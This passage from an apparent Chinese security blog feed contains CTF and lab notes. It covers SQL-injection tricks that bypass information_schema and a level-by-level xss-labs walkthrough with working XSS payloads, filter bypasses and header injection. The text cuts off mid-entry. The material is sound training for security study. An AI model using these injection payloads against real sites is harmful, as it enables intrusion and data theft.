title="InnoDB引擎"></a>InnoDB引擎</h4><blockquote><p>从MySQL 5.5.8开始，InnoDB成为其默认存储引擎。而在MySQL  5.6以上的版本中，InnoDb增加了innodb_index_stats和innodb_table_stats两张表，这两张表中都存储了数据库和其数据表的信息，但是没有存储列名。</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(database_name) <span class="keyword">from</span> mysql.innodb_table_stats;</span><br><span class="line"><span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> mysql.innodb_table_stats <span class="keyword">where</span> database_name<span class="operator">=</span>database()</span><br></pre></td></tr></table></figure><h4 id="sys库"><a href="#sys库" class="headerlink" title="sys库"></a>sys库</h4><blockquote><p>在MySQL 5.7中，新增了sys系统数据库，通过这个库可以快速地了解系统的元数据信息。sys库是通过视图的形式把information_schema和performance_schema结合起来，查询出更加令人容易理解的数据。</p></blockquote><h5 id="sys-schema-auto-increment-columns查询含有自增id的表"><a href="#sys-schema-auto-increment-columns查询含有自增id的表" class="headerlink" title="sys.schema_auto_increment_columns查询含有自增id的表"></a>sys.schema_auto_increment_columns查询含有自增id的表</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> sys.schema_auto_increment_columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database();</span><br></pre></td></tr></table></figure><h5 id="schema-table-statistics-with-buffer"><a href="#schema-table-statistics-with-buffer" class="headerlink" title="schema_table_statistics_with_buffer"></a>schema_table_statistics_with_buffer</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_schema <span class="keyword">from</span> sys.schema_table_statistics_with_buffer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> sys.schema_table_statistics_with_buffer <span class="keyword">where</span> table_schema<span class="operator">=</span>database();</span><br></pre></td></tr></table></figure><h5 id="x-schema-table-statistics-with-buffer"><a href="#x-schema-table-statistics-with-buffer" class="headerlink" title="x$schema_table_statistics_with_buffer"></a>x$schema_table_statistics_with_buffer</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_schema <span class="keyword">from</span> sys.x$schema_table_statistics_with_buffer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> sys.x$schema_table_statistics_with_buffer <span class="keyword">where</span> table_schema<span class="operator">=</span>database();</span><br></pre></td></tr></table></figure><h3 id="无列名"><a href="#无列名" class="headerlink" title="无列名"></a>无列名</h3><h4 id="子查询"><a href="#子查询" class="headerlink" title="子查询"></a>子查询</h4><p>原理: 将要查询的表中的内容导入到零时表中, 再从零时表中通过自定义的列名来查询出数据</p><p>示例:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> id,username,password <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">100</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> <span class="number">2</span>        <span class="operator">|</span> <span class="number">3</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>假设此时要查询所有的username, 就可以对第二个查询的字段进行子查询字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> id,username,password <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(`<span class="number">2</span>`) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)a),<span class="number">3</span>;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240226232242851.png" alt="image-20240226232242851"></p><p>这里union后面一共查询了三次:</p><p><strong>第一次</strong></p><p>也就是最内层的</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240226232548082.png" alt="image-20240226232548082"></p><p><strong>第二次</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> group_concat(`<span class="number">2</span>`) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)a;</span><br></pre></td></tr></table></figure><p>将第一次查询得到的表中<code>2</code>字段的内容(也就是原users表中username的内容)查出来再生成一张零时表</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240226232717346.png" alt="image-20240226232717346"></p><p><strong>第三次</strong></p><p>合并</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(`<span class="number">2</span>`) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)a),<span class="number">3</span>;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240226232830882.png" alt="image-20240226232830882"></p><h4 id="join-using"><a href="#join-using" class="headerlink" title="join using"></a>join using</h4><p>这里需要有报错回显</p><p>payload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">as</span> a <span class="keyword">join</span> users <span class="keyword">as</span> b)<span class="keyword">as</span> c;</span><br></pre></td></tr></table></figure><p>报出第一个列名为id</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">as</span> a <span class="keyword">join</span> users <span class="keyword">as</span> b <span class="keyword">using</span>(id))<span class="keyword">as</span> c;</span><br></pre></td></tr></table></figure><p>报出第二个列名为username</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">as</span> a <span class="keyword">join</span> users <span class="keyword">as</span> b <span class="keyword">using</span>(id,username))<span class="keyword">as</span> c;</span><br></pre></td></tr></table></figure><p>以此类推</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240226233801718.png" alt="image-20240226233801718"></p><h4 id="order-by盲注"><a href="#order-by盲注" class="headerlink" title="order by盲注"></a>order by盲注</h4><p>通过字典序来猜测内容</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>,<span class="number">3</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">2</span>;#a <span class="operator">&lt;</span> h,回显a</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> a        <span class="operator">|</span> <span class="number">3</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> hcj      <span class="operator">|</span> <span class="number">123456</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="string">&#x27;i&#x27;</span>,<span class="number">3</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">2</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> hcj      <span class="operator">|</span> <span class="number">123456</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> i        <span class="operator">|</span> <span class="number">3</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="string">&#x27;hci&#x27;</span>,<span class="number">3</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">2</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> hci      <span class="operator">|</span> <span class="number">3</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> hcj      <span class="operator">|</span> <span class="number">123456</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="string">&#x27;hck&#x27;</span>,<span class="number">3</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">2</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span> id <span class="operator">|</span> username <span class="operator">|</span> password <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> hcj      <span class="operator">|</span> <span class="number">123456</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> hck      <span class="operator">|</span> <span class="number">3</span>        <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+----------+----------+</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SWPU2019-Web1&quot;&gt;&lt;a href=&quot;#SWPU2019-Web1&quot; class=&quot;headerlink&quot; title=&quot;SWPU2019-Web1&quot;&gt;&lt;/a&gt;SWPU2019-Web1&lt;/h1&gt;&lt;p&gt;在注册登录后广告申请处 广告名字段存在注入&lt;/p&gt;
</summary>
      
    
    
    
    <category term="buu刷题记录" scheme="http://example.com/categories/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    
    <category term="mysql绕过information_schema注入" scheme="http://example.com/tags/mysql%E7%BB%95%E8%BF%87information-schema%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>xss-labs</title>
    <link href="http://example.com/2024/02/20/xss-labs/"/>
    <id>http://example.com/2024/02/20/xss-labs/</id>
    <published>2024-02-20T10:07:56.000Z</published>
    <updated>2024-02-24T02:50:23.732Z</updated>
    
    <content type="html"><![CDATA[<h1 id="xss-labs"><a href="#xss-labs" class="headerlink" title="xss-labs"></a>xss-labs</h1><p>手动搭建了一个本地靶场</p><p>原github项目地址</p><p><a href="https://github.com/do0dl3/xss-labs">https://github.com/do0dl3/xss-labs</a></p><h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240220181007551.png"></p><h2 id="level-2-“-闭合"><a href="#level-2-“-闭合" class="headerlink" title="level 2(“&gt;闭合)"></a>level 2(“&gt;闭合)</h2><p>产看源码发现与上一关不同的是使用了以下函数:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//htmlspecialchars($str)</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br></pre></td></tr></table></figure><p>但是在另一个位置也就是输入框内, 并没有使用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level2.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;&quot;&gt; </span></span><br></pre></td></tr></table></figure><p>此时可以构造闭合掉input及其属性</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223163910163.png" alt="image-20240223163910163"></p><h2 id="level-3-构造鼠标事件"><a href="#level-3-构造鼠标事件" class="headerlink" title="level 3(构造鼠标事件)"></a>level 3(构造鼠标事件)</h2><p>相较于上一关, 这关都加了 htmlspecialchars($str) 进行转义</p><p>但是</p><blockquote><p>htmlspecialchars($str) 默认不转义单引号</p></blockquote><p>因此可以构造一个onclick时间, 点击后执行js代码</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; onclick=&#x27;alert(1)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223164554832.png" alt="image-20240223164554832"></p><p>点击输入框就会执行js</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223164620880.png" alt="image-20240223164620880"></p><h2 id="level-4-构造鼠标事件"><a href="#level-4-构造鼠标事件" class="headerlink" title="level 4(构造鼠标事件)"></a>level 4(构造鼠标事件)</h2><p>简单测试发现这里直接删除了尖括号, 但是并没有删除双引号, 并且也没对双引号进行转义</p><p>恰巧这里的value属性使用双引号闭合</p><p>只需将上一题的单引号改为双引号即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=&quot;alert(1)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223165143411.png" alt="image-20240223165143411"></p><h2 id="level-5-伪协议JavaScript"><a href="#level-5-伪协议JavaScript" class="headerlink" title="level 5(伪协议JavaScript:)"></a>level 5(伪协议JavaScript:)</h2><p>这关似乎添加了黑名单,之前的<code>&lt;script&gt; onclick</code>会被修改为<code>o_nclick &lt;scr_ipt&gt;</code></p><p>使用**JavaScript:**伪协议来执行js</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=javascript:alert(1)&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223170134184.png" alt="image-20240223170134184"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223170148930.png" alt="image-20240223170148930"></p><p>点击插入的超链接即可</p><h2 id="level-6-大小写绕过"><a href="#level-6-大小写绕过" class="headerlink" title="level 6 (大小写绕过)"></a>level 6 (大小写绕过)</h2><p>这里使用上一关的payload会发现href也被过滤了</p><p>但是我们知道, html是大小写不敏感的</p><p>直接构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a hREf=javascript:alert(1)&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223170543131.png" alt="image-20240223170543131"></p><p>部分源码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;&lt;script&quot;</span>,<span class="string">&quot;&lt;scr_ipt&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;o_n&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;sr_c&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;da_ta&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;hr_ef&quot;</span>,<span class="variable">$str5</span>);</span><br></pre></td></tr></table></figure><h2 id="level-7-双写绕过"><a href="#level-7-双写绕过" class="headerlink" title="level 7(双写绕过)"></a>level 7(双写绕过)</h2><p>这关会删除了script  href 等等字符串</p><p>只需要双写绕过即可</p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a hrhrefef=javascrscriptipt:alert(1)&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223171113140.png" alt="image-20240223171113140"></p><p>部分源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str</span> =<span class="title function_ invoke__">strtolower</span>( <span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;on&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;src&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="variable">$str6</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;href&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$str5</span>);</span><br></pre></td></tr></table></figure><h2 id="level-8-实体编码绕过"><a href="#level-8-实体编码绕过" class="headerlink" title="level 8(实体编码绕过)"></a>level 8(实体编码绕过)</h2><p>这关过滤的更加严格, 大小写, 转义, 替换 都用上了</p><p>但是我们输入的内容会被放进一个超链接里</p><p>可以使用实体编码来绕过对我们输入内容的替换</p><p><a href="https://www.qqxiuzi.cn/bianma/zifushiti.php">https://www.qqxiuzi.cn/bianma/zifushiti.php</a></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223172033713.png" alt="image-20240223172033713"></p><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223172232860.png" alt="image-20240223172232860"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223172002536.png" alt="image-20240223172002536"></p><h2 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h2><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223172339270.png" alt="image-20240223172339270"></p><p>这关我以为是识别到编码了, 实际上是需要含有<code>http://</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="literal">false</span>===<span class="title function_ invoke__">strpos</span>(<span class="variable">$str7</span>,<span class="string">&#x27;http://&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="variable">$str7</span>.<span class="string">&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里并没有要求要以<code>http://</code>开头, 所以只需要把它加在后面并注释掉即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;//http://</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223172906831.png" alt="image-20240223172906831"></p><h2 id="level-10-修改hidden内容"><a href="#level-10-修改hidden内容" class="headerlink" title="level 10(修改hidden内容)"></a>level 10(修改hidden内容)</h2><p>随便输入一下, 发现这里还有几个隐藏参数</p><p>这里尝试get将同名都提交一遍</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://xss-labs/level10.php</span><br><span class="line">?keyword=1</span><br><span class="line">&amp;t_link=2</span><br><span class="line">&amp;t_history=3</span><br><span class="line">&amp;t_sort=4</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223173715090.png" alt="image-20240223173715090"></p><p>发现t_sort是有回显的</p><p>简单测试后发现会删除尖括号, 但依然可以构造鼠标事件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?keyword=1</span><br><span class="line">&amp;t_link=2</span><br><span class="line">&amp;t_history=3</span><br><span class="line">&amp;t_sort=4&quot; onclick=&quot;alert(1)&quot; type=&quot;text&quot;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223173920165.png" alt="image-20240223173920165"></p><h2 id="level-11-referer注入"><a href="#level-11-referer注入" class="headerlink" title="level 11(referer注入)"></a>level 11(referer注入)</h2><p>这里查看源码会发现有一个参数的值非常特殊</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223174342942.png" alt="image-20240223174342942"></p><p>这个t_ref的值正式我们上一关的地址和payload</p><p>我们都知道http头的referer正是记录了上一个页面的地址, 所以这里可以通过修改referer来注入</p><p>添加http头:</p><p><code>Referer: &quot; onclick=&quot;alert(1)&quot; type=&quot;text&quot;</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240223174857257.png" alt="image-20240223174857257"></p><h2 id="level-12-User-Agent注入"><a href="#level-12-User-Agent注入" class="headerlink" title="level 12(User-Agent注入)"></a>level 12(User-Agent注入)</h2><p><img 